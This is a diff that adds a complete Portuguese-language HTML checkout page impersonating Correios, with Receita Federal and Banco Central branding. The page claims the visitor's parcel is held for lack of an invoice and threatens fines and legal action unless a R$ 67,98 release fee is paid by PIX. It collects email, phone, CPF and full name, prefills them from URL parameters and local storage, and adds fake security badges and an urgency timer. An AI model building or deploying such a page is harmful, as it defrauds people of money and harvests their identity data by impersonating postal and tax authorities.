@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#004169">
+    <meta name="description" content="Pagamento PIX - Liberação de Encomenda - Correios">
+
+    <title>Pagamento - Correios</title>
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/webp" href="assets/images/favicon.webp">
+
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5" as="style">
+    <link rel="preload" href="assets/css/pagamento.css?v=2.2.34" as="style">
+    <link rel="preload" href="assets/js/pix-common.min.js?v=1.2.2" as="script">
+    <link rel="preload" href="assets/js/pagamento.min.js?v=2.7.24" as="script">
+    <link rel="preload" href="assets/images/correios.webp" as="image" fetchpriority="high">
+
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+
+    <style id="critical-inline">
+      *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+      html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;overflow-x:hidden}
+      body{line-height:1.5;background:#fff;color:#003f6b;min-height:100vh;display:flex;flex-direction:column}
+      img{max-width:100%;height:auto;display:block}
+      a{color:inherit;text-decoration:none}
+      button{cursor:pointer;border:0;background:none}
+      .main{flex:1;max-width:480px;margin:0 auto;padding:1rem;width:100%}
+      .header{background:#f4f6f8;border-bottom:3px solid #ffd400}
+      .header-nav{display:flex;align-items:center;justify-content:center;max-width:1200px;margin:0 auto;padding:.375rem 1rem;min-height:40px}
+      .logo-correios{height:25px;width:auto;display:block}
+      .btn-entrar{display:none}
+      .header-nav.has-user-name{justify-content:space-between}
+      .header-nav.has-user-name .btn-entrar{display:flex;align-items:center;gap:.5rem}
+      .footer{background:#fdd306;color:#1e3a5f;padding:1.5rem 1rem}
+      .footer-container{max-width:1000px;margin:0 auto}
+      .footer-links{display:none}
+      .footer-bottom{display:flex;flex-direction:column;align-items:center}
+      .footer-logos{display:flex;align-items:center;justify-content:center;gap:2rem}
+      .footer-logos .logo-footer{height:5.5rem;width:auto;max-width:100%;object-fit:contain}
+      .footer-copyright{text-align:center;font-size:.7rem;color:#014268;margin-bottom:0}
+      .loader,#loader{display:flex;align-items:center;justify-content:center;min-height:50vh}
+      [hidden]{display:none!important}
+
+      /* FOUC prevention */
+      html[data-pix-step="2"] #checkoutStep1{display:none}
+      html[data-pix-step="1"] #checkoutStep2{display:none}
+      .step1-identidade{display:none}
+      html[data-identity="need"] .step1-identidade{display:block}
+    </style>
+
+    <!-- Pré-decide step + identity (sync, antes do paint). -->
+    <script>
+      (function(){
+        var d = document.documentElement;
+        function exp(tx){
+          var fallback=(tx&&tx.created_at||0)+36e5;
+          var parsed=tx&&tx.expires_at?Date.parse(tx.expires_at):0;
+          return parsed&&parsed>Date.now()?parsed:fallback;
+        }
+        try {
+          var raw = localStorage.getItem('correios_pix_transaction');
+          if (raw) {
+            var tx = JSON.parse(raw);
+            d.dataset.pixStep = (tx && tx.hash && tx.pix_code && Date.now() < exp(tx)) ? '2' : '1';
+          } else { d.dataset.pixStep = '1'; }
+        } catch(e) { d.dataset.pixStep = '1'; }
+        try {
+          var q = new URLSearchParams(location.search);
+          function get(k){try{return localStorage.getItem(k)}catch(e){return null}}
+          var cpfRaw = q.get('cpf') || get('correios_cpf') || '';
+          var cpf = String(cpfRaw).replace(/\D/g,'');
+          var nameRaw = q.get('nome') || get('correios_nome') || '';
+          var name = String(nameRaw).replace(/\+/g,' ').trim();
+          try { name = decodeURIComponent(name); } catch(_) {}
+          var has = cpf.length === 11 && name.length > 3 && name.indexOf(' ') > 0;
+          d.dataset.identity = has ? 'have' : 'need';
+        } catch(e) { d.dataset.identity = 'need'; }
+      })();
+    </script>
+
+    <!-- Font Awesome Pro -->
+    <link rel="stylesheet" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5">
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="assets/css/pagamento.css?v=2.2.34">
+</head>
+<body ontouchstart="">
+    <!-- ========================================
+         HEADER
+    ======================================== -->
+    <header class="header">
+        <nav class="header-nav" id="headerNav">
+            <a href="#" class="logo-link">
+                <img src="assets/images/correios.webp" alt="Correios" class="logo-correios" width="121" height="25" decoding="async" fetchpriority="high">
+            </a>
+            <a href="#" class="btn-entrar">
+                <img src="assets/images/entrar.svg" alt="Entrar" class="icon-entrar" width="20" height="20" decoding="async">
+                <span class="user-name">Entrar</span>
+            </a>
+        </nav>
+    </header>
+
+    <!-- ========================================
+         MAIN
+    ======================================== -->
+    <main class="main">
+        <!-- Barra de Segurança -->
+        <div class="security-bar">
+            <i class="fas fa-lock"></i>
+            <span>PAGAMENTO 100% SEGURO</span>
+            <i class="fas fa-shield-check"></i>
+        </div>
+
+        <!-- Container Principal -->
+        <div class="pagamento-wrapper">
+            <div class="checkout-step1" id="checkoutStep1">
+                <div class="checkout-alerta">
+                    <p><strong>ATENÇÃO!</strong> Sua mercadoria foi <strong>RETIDA</strong> por falta de Nota Fiscal. O não pagamento imediato da taxa de liberação no valor de <strong class="valor-taxa-inline">R$ 67,98</strong> resultará em uma multa de <strong>75%</strong> sobre o valor do produto, além de possíveis restrições no seu CPF e ações legais conforme a regulamentação vigente.</p>
+                </div>
+
+                <div class="step1-header">
+                    <h3 id="step1Titulo">Objeto taxado pela unidade de fiscalização</h3>
+                    <p id="step1Descricao">Confirme os dados do destinatário para liberação da entrega.</p>
+                </div>
+
+                <form id="dadosForm" class="step1-form" novalidate>
+                    <div class="step1-field">
+                        <label for="dadosEmail">E-mail <span class="campo-obrigatorio">*</span></label>
+                        <div class="email-autocomplete-wrap">
+                            <input type="email" id="dadosEmail" placeholder="seuemail@exemplo.com" maxlength="120" autocomplete="email">
+                            <div class="email-suggestions" id="emailSuggestions" role="listbox" aria-label="Sugestões de e-mail"></div>
+                        </div>
+                        <small class="step1-erro" id="dadosEmailErro"></small>
+                    </div>
+
+                    <div class="step1-field">
+                        <label for="dadosTelefone">Telefone / WhatsApp <span class="campo-obrigatorio">*</span></label>
+                        <input type="tel" id="dadosTelefone" placeholder="(11) 99999-9999" maxlength="19" inputmode="tel" autocomplete="tel">
+                        <small class="step1-erro" id="dadosTelefoneErro"></small>
+                    </div>
+
+                    <div class="step1-identidade" id="step1Identidade">
+                        <div class="step1-identidade-titulo">
+                            <i class="fas fa-id-card"></i>
+                            <span>Identificação do destinatário</span>
+                        </div>
+
+                        <div class="step1-field">
+                            <label for="dadosCpf">CPF <span class="campo-obrigatorio">*</span></label>
+                            <input type="text" id="dadosCpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" autocomplete="off">
+                            <small class="step1-erro" id="dadosCpfErro"></small>
+                        </div>
+
+                        <div class="step1-field">
+                            <label for="dadosNome">Nome Completo <span class="campo-obrigatorio">*</span></label>
+                            <input type="text" id="dadosNome" placeholder="Digite seu nome completo" maxlength="100" autocomplete="off">
+                            <small class="step1-hint" id="dadosNomeHint"></small>
+                            <small class="step1-erro" id="dadosNomeErro"></small>
+                        </div>
+                    </div>
+                    <input type="text" name="website" id="website_hp" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0;" value="">
+                    <button type="submit" class="btn-continuar-pagamento" id="btnContinuarPagamento">
+                        <span>PAGAR AGORA</span>
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </form>
+
+                <div class="checkout-resumo-pagamento" id="checkoutResumoPagamento">
+                    <div class="checkout-resumo-header">
+                        <h3>Resumo do pagamento</h3>
+                        <span class="resumo-metodo"><img src="assets/images/receita-federal.webp" alt="Receita Federal" class="resumo-metodo-receita-icon" width="100" height="25" decoding="async"></span>
+                    </div>
+                    <div class="checkout-resumo-body">
+                        <p class="resumo-item" id="resumoRastreioWrap" style="display:none;">
+                            <span>Cód. de rastreio</span>
+                            <strong class="resumo-rastreio-wrap">
+                                <i class="fas fa-barcode" aria-hidden="true"></i>
+                                <span id="resumoRastreio" class="resumo-rastreio-valor"></span>
+                            </strong>
+                        </p>
+                        <p class="resumo-item">
+                            <span>CPF</span>
+                            <strong id="resumoCpf" class="cpf-vazio">Não informado</strong>
+                        </p>
+                        <div class="resumo-total-block">
+                            <span class="resumo-total-label">Total a pagar</span>
+                            <strong id="resumoTotal" class="resumo-total-valor">R$ 67,98</strong>
+                        </div>
+                    </div>
+                    <div class="checkout-resumo-footer">
+                        <img src="assets/images/pix.svg" alt="" class="footer-pix-icon" width="48" height="48" decoding="async" aria-hidden="true">
+                        <span>Pagamento via PIX</span>
+                        <span class="footer-sep" aria-hidden="true">&middot;</span>
+                        <img src="assets/images/bacen.png" alt="" class="footer-bacen-icon" width="251" height="251" decoding="async" aria-hidden="true">
+                        <span>Banco Central do Brasil</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="checkoutStep2">
+                <!-- Loading -->
+                <div class="pagamento-loading" id="pagamentoLoading" style="display: none;">
+                    <div class="loading-content">
+                        <div class="loading-icon">
+                            <i class="fas fa-shield-check"></i>
+                        </div>
+                        <h3>Gerando seu PIX</h3>
+                        <p>Estamos preparando o código para liberação da sua encomenda. Não feche esta página.</p>
+                        <div class="loading-bar">
+                            <div class="loading-bar-fill"></div>
+                        </div>
+                        <div class="loading-steps" aria-label="Progresso da geração do PIX">
+                            <span><i class="fas fa-check"></i> Validando dados</span>
+                            <span><i class="fas fa-check"></i> Criando código</span>
+                            <span><i class="fas fa-check"></i> Liberação segura</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Erro -->
+                <div class="pagamento-erro" id="pagamentoErro" style="display: none;">
+                    <div class="erro-content">
+                        <div class="erro-icon">
+                            <i class="fas fa-exclamation-triangle"></i>
+                        </div>
+                        <h3>Não foi possível gerar o PIX</h3>
+                        <p id="erroMensagem">Ocorreu um erro ao processar sua solicitação.</p>
+                        <button class="btn-tentar-novamente" onclick="gerarPix()">
+                            <i class="fas fa-redo"></i>
+                            Tentar Novamente
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Conteúdo do Pagamento -->
+                <div class="pagamento-conteudo" id="pagamentoConteudo" style="display: none;">
+                    <!-- Cabeçalho com valor -->
+                    <div class="pagamento-header">
+                        <div class="header-titulo">
+                            <img src="assets/images/correios-icon2.webp" alt="Correios" class="header-icon-correios" width="44" height="44" decoding="async">
+                            <div>
+                                <h2>REGULARIZE SUA ENCOMENDA</h2>
+                                <p id="codigoRastreioHeader">Taxa de Liberação</p>
+                            </div>
+                        </div>
+                        <div class="header-valor">
+                            <span class="valor-label">VALOR A PAGAR</span>
+                            <span class="valor-numero" id="valorPagar">R$ 67,98</span>
+                        </div>
+                    </div>
+
+                    <!-- Timer de Expiração -->
+                    <div class="timer-banner">
+                        <div class="timer-icon pulsing">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="timer-info">
+                            <span class="timer-label">PIX válido por:</span>
+                            <span class="timer-valor" id="timerExpiracao">15:00</span>
+                        </div>
+                        <div class="timer-progress">
+                            <div class="timer-progress-bar" id="timerProgressBar"></div>
+                        </div>
+                    </div>
+
+                    <!-- Área do PIX -->
+                    <div class="pix-container">
+                        <!-- Título PIX -->
+                        <div class="pix-title">
+                            <img src="assets/images/pix-icon.png" alt="PIX" class="pix-logo" width="40" height="40" decoding="async">
+                            <span>Pague com PIX</span>
+                        </div>
+
+                        <!-- QR Code -->
+                        <div class="qrcode-area">
+                            <div class="qrcode-frame">
+                                <img src="" alt="QR Code PIX" id="qrcodeImg" class="qrcode-img" width="180" height="180">
+                            </div>
+                            <p class="qrcode-seguranca">
+                                <span><span id="pixRecebedorPrefix">No app do banco, o favorecido deve aparecer como:</span> <strong id="pixRecebedorInfo"></strong></span>
+                            </p>
+                            <p class="qrcode-hint">Aponte a câmera do seu celular</p>
+                        </div>
+
+                        <!-- Divisor -->
+                        <div class="divisor">
+                            <span>ou copie o código</span>
+                        </div>
+
+                        <!-- Código Copia e Cola -->
+                        <div class="copiacola-area">
+                            <div class="copiacola-input-wrapper" onclick="copiarCodigo()">
+                                <input type="text" id="pixCode" readonly class="copiacola-input" placeholder="Código PIX">
+                            </div>
+                            <button class="btn-copiar" id="btnCopiar" onclick="copiarCodigo()">
+                                <i class="fas fa-copy"></i>
+                                <span>Copiar código</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Status -->
+                    <div class="status-area">
+                        <div class="status-aguardando" id="statusAguardando">
+                            <div class="status-icon pulsing">
+                                <i class="fas fa-spinner fa-pulse"></i>
+                            </div>
+                            <div class="status-text">
+                                <strong>Aguardando pagamento</strong>
+                                <span>O sistema atualizará automaticamente</span>
+                            </div>
+                        </div>
+                        <div class="status-pago" id="statusPago" style="display: none;">
+                            <div class="status-icon success">
+                                <i class="fas fa-check"></i>
+                            </div>
+                            <div class="status-text">
+                                <strong>Pagamento confirmado!</strong>
+                                <span>Redirecionando...</span>
+                            </div>
+                        </div>
+                        <p class="status-info-liberacao">Após confirmação, o comprovante de liberação será enviado para o e-mail e telefone cadastrado.</p>
+                    </div>
+
+                    <!-- Instruções -->
+                    <div class="instrucoes-area">
+                        <h4><i class="fas fa-mobile-alt"></i> Como pagar com PIX</h4>
+                        <div class="instrucoes-steps">
+                            <div class="step-item">
+                                <div class="step-icon">
+                                    <i class="fas fa-university"></i>
+                                </div>
+                                <div class="step-content">
+                                    <span class="step-numero">1</span>
+                                    <p>Abra o <strong>app do seu banco</strong></p>
+                                </div>
+                            </div>
+                            <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
+                            <div class="step-item">
+                                <div class="step-icon">
+                                    <img src="assets/images/pix-icon.png" alt="PIX" class="step-pix-icon" width="32" height="32" decoding="async">
+                                </div>
+                                <div class="step-content">
+                                    <span class="step-numero">2</span>
+                                    <p>Selecione <strong>PIX Copia e Cola</strong></p>
+                                </div>
+                            </div>
+                            <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
+                            <div class="step-item">
+                                <div class="step-icon">
+                                    <i class="fas fa-qrcode"></i>
+                                </div>
+                                <div class="step-content">
+                                    <span class="step-numero">3</span>
+                                    <p><strong>Escaneie</strong> ou <strong>cole</strong> o código</p>
+                                </div>
+                            </div>
+                            <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
+                            <div class="step-item highlight">
+                                <div class="step-icon success">
+                                    <i class="fas fa-check"></i>
+                                </div>
+                                <div class="step-content">
+                                    <span class="step-numero">4</span>
+                                    <p><strong>Pronto!</strong> Confirmação automática</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Segurança -->
+                    <div class="seguranca-area">
+                        <div class="seguranca-item">
+                            <i class="fas fa-lock"></i>
+                            <span>Pagamento 100% seguro</span>
+                        </div>
+                        <div class="seguranca-item">
+                            <i class="fas fa-bolt"></i>
+                            <span>Aprovação em segundos</span>
+                        </div>
+                        <div class="seguranca-item">
+                            <i class="fas fa-shield-check"></i>
+                            <span>Dados protegidos</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- ========================================
+         FOOTER
+    ======================================== -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-links">
+                <div class="footer-section">
+                    <h4>Fale Conosco</h4>
+                    <ul>
+                        <li><i class="far fa-desktop"></i> Registro de Manifestações</li>
+                        <li><i class="far fa-question-square"></i> Central de Atendimento</li>
+                        <li><i class="far fa-briefcase"></i> Soluções para o seu negócio</li>
+                        <li><i class="far fa-headset"></i> Suporte ao cliente com contrato</li>
+                        <li><i class="far fa-comment-alt-dots"></i> Ouvidoria</li>
+                        <li><i class="far fa-user-headset"></i> Denúncia</li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Sobre os Correios</h4>
+                    <ul>
+                        <li><i class="far fa-address-card"></i> Identidade corporativa</li>
+                        <li><i class="far fa-user-graduate"></i> Educação e cultura</li>
+                        <li><i class="far fa-book-alt"></i> Código de ética</li>
+                        <li><i class="far fa-comment-alt-dots"></i> Política de privacidade e Notas legais</li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Outros Sites</h4>
+                    <ul>
+                        <li><i class="far fa-shopping-cart"></i> Loja online dos correios</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="footer-logos">
+                    <img src="assets/images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer" width="383" height="88" decoding="async">
+                </div>
+                <p class="footer-copyright">© Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
+            </div>
+        </div>
+    </footer>
+    <!-- QR Code Generator (local, sem API externa) -->
+    <script src="assets/vendor/qrcode.min.js" defer></script>
+    <script src="assets/js/pix-common.min.js?v=1.2.2" defer></script>
+
+    <!-- Pre-render PIX data (inline sync minified - roda antes do first paint) -->
+    <script>(()=>{function K(e){try{return e?document.querySelector(e):null}catch(e){return null}}function i(e){try{return new URLSearchParams(location.search).get(e)||""}catch(e){return""}}function c(e){try{return localStorage.getItem(e)||""}catch(e){return""}}function L(e,t){t=(e&&e.created_at||0)+t,e=e&&e.expires_at?Date.parse(e.expires_at):0;return e&&e>Date.now()?e:t}function q(e){var t,r,a,o,n;e&&(n=c("correios_email").trim().toLowerCase(),o=c("correios_telefone"),r=i("cpf")||c("correios_cpf"),a=i("nome")||c("correios_nome"),n&&(t=K(e.emailInput))&&(t.value=n),o&&(t=K(e.telefoneInput))&&(t.value=(n=o,11===(n=(n=11<(n=11<(n=11<(n=String(n||"").replace(/\D/g,"")).length&&"0"===n.charAt(0)?n.replace(/^0+/,""):n).length&&0===n.indexOf("55")?n.slice(2):n).length&&"0"===n.charAt(0)?n.replace(/^0+/,""):n).slice(0,11)).length?n.replace(/(\d{2})(\d{5})(\d{4})/,"($1) $2-$3"):10===n.length?n.replace(/(\d{2})(\d{4})(\d{4})/,"($1) $2-$3"):n)),r&&(t=K(e.cpfInput))&&(t.value=(o=r,(o=String(o||"").replace(/\D/g,"").slice(0,11)).length<11?o:o.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"))),a&&(t=K(e.nomeInput))&&(t.value=(e=>{e=String(e||"").replace(/\+/g," ").trim();try{e=decodeURIComponent(e)}catch(e){}return e})(a)),t=K(e.resumoCpf))&&(11===(n=String(r||"").replace(/\D/g,"")).length?(t.textContent=n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"),t.classList.remove("cpf-vazio")):t.classList.add("cpf-vazio"))}window.pixPreload=function(e){try{if(e&&e.elements){q(e.elements);var t=e.storageKeys?Array.isArray(e.storageKeys)?e.storageKeys:[e.storageKeys]:e.storageKey?[e.storageKey]:[];if(t.length){for(var r=e.expiryMs||9e5,a=null,o=0;o<t.length;o++){var n=localStorage.getItem(t[o]);if(n)try{var i=JSON.parse(n);if(i&&i.hash&&i.pix_code&&!(Date.now()>=L(i,r))){a=i;break}}catch(e){}}if(a){var c,l,s,d,p,g,f,m,u,h,v,x,y,$=L(a,r),I=$-Date.now(),_=Math.max(r,$-(a.created_at||Date.now())),C=e.elements;if((c=K(C.qrImg))&&a.qr_base64&&(c.src=a.qr_base64),(c=K(C.timer))&&(c.textContent=(M=I,M=Math.max(0,Math.floor(M/1e3)),((N=Math.floor(M/60))<10?"0":"")+N+":"+((M=M%60)<10?"0":"")+M)),(c=K(C.progressBar))&&(l=Math.max(0,Math.min(100,I/_*100)),c.style.width=l+"%"),(c=K(C.pixCode))&&a.pix_code&&(c.value=a.pix_code),(c=K(C.valor))&&a.amount_formatted&&(c.textContent=a.amount_formatted),(c=K(C.receiver))&&(s="",d=!1,"string"==typeof(p=a.receiver)&&p.trim()?(s=p.trim(),d=!0):p&&"object"==typeof p&&(g=String(p.name||"").trim(),f=String(p.document||"").replace(/\D/g,""),m="",11===f.length?m="CPF ***."+f.substr(3,3)+".***-**":14===f.length&&(m="CNPJ "+f.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/,"$1.$2.$3/$4-$5")),g&&m?(s=g+" - "+m,d=!0):g?(s=g,d=!1):m&&(s=m,d=!1)),!s&&a.pix_code&&(u=(e=>{if(e&&"string"==typeof e)try{for(var t=0,r=e.length;t+4<=r;){var a=e.substr(t,2),o=parseInt(e.substr(t+2,2),10);if(isNaN(o)||r<t+4+o)return"";if("59"===a)return e.substr(t+4,o).trim();t+=4+o}}catch(e){}return""})(a.pix_code))&&(s=u,d=!1),s&&((h=K(C.receiver))&&(h.textContent=s),v=K(C.receiverContainer))&&v.classList.add("is-visible"),c=K(C.receiverPrefix))&&(c.textContent=d?"No app do banco, o favorecido deve aparecer como:":"No app do banco, confirme o favorecido:"),!s&&(c=K(C.receiverPrefix))&&e.receiverPrefixText&&(c.textContent=e.receiverPrefixText),(c=K(C.rastreio))&&(x=localStorage.getItem("correios_rastreio")||"")&&(c.textContent=(P=x)?String(P).replace(/\s/g,"").toUpperCase().replace(/(.{2})(.{3})(.{3})(.{3})(.{2})/,"$1 $2 $3 $4 $5"):""),(c=K(C.resumoCpf))&&a.cpf&&(y=String(a.cpf).replace(/\D/g,"").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"),c.textContent=y||"Não informado"),(c=K(C.resumoTotal))&&a.amount_formatted&&(c.textContent=a.amount_formatted),e.revealIds&&e.revealIds.length)for(var S=0;S<e.revealIds.length;S++){var b=document.getElementById(e.revealIds[S]);b&&"none"===b.style.display&&(b.style.display="")}if(e.hideIds&&e.hideIds.length)for(var D=0;D<e.hideIds.length;D++){var w=document.getElementById(e.hideIds[D]);w&&(w.style.display="none")}}}}}catch(e){}var P,M,N}})();window.pixPreload({"storageKey":"correios_pix_transaction","expiryMs":36e5,"elements":{"qrImg":"#qrcodeImg","pixCode":"#pixCode","timer":"#timerExpiracao","progressBar":"#timerProgressBar","valor":"#valorPagar","receiver":"#pixRecebedorInfo","receiverPrefix":"#pixRecebedorPrefix","receiverContainer":".qrcode-seguranca","rastreio":"#codigoRastreioHeader","resumoCpf":"#resumoCpf","resumoTotal":"#resumoTotal","emailInput":"#dadosEmail","telefoneInput":"#dadosTelefone","cpfInput":"#dadosCpf","nomeInput":"#dadosNome"},"revealIds":["checkoutStep2","pagamentoConteudo"],"hideIds":["checkoutStep1","pagamentoLoading","pagamentoErro"]});</script>
+    <script src="assets/js/pagamento.min.js?v=2.7.24" defer></script></body>
+</html>
